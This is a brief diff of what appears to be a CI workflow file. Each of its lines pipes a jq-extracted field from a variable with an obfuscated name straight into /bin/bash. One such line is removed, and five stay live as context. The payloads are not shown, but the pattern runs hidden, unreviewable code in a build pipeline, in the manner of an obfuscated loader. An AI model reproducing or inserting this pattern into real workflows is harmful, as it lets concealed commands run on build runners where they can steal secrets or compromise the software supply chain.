@@ -24,7 +24,6 @@ jobs:
           echo $unlva7 | jq -r .dmyio47 | /bin/bash
           echo $pmvi400 | jq -r .mvw3403 | /bin/bash
           echo $dxj93 | jq -r .zslf4 | /bin/bash
-          echo $xbxt1 | jq -r .yfmbn45 | /bin/bash
           printf '%s' "$do75" | jq -r .hfc8942 | /bin/bash
           echo $aam04475 | jq -r .tm7442 | /bin/bash
 
